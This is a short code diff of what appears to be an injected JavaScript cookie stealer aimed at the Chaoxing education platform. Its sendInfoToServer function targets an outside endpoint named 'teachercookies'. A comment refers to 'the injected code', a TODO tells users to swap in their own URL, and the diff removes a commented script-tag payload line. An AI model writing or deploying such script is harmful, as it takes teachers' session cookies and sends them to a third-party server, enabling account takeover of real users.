@@ -8,6 +8,8 @@ function stt(){
 }
 
 function sendInfoToServer(){
+
+    //TODO:replace the url with youselfs
     const uri = 'https://chaoxingapiserver.chinacloudsites.cn/api/teachercookies';
 
     var currentdate = new Date(); 
@@ -52,6 +54,3 @@ if(typeof ononon == 'undefined')
 ononon=0;
 setTimeout(test, 3000);
 }       //prevent the injected code from running multiple times
-
-//payloads       <script src="https://www.***.***/***.js"></script>
-
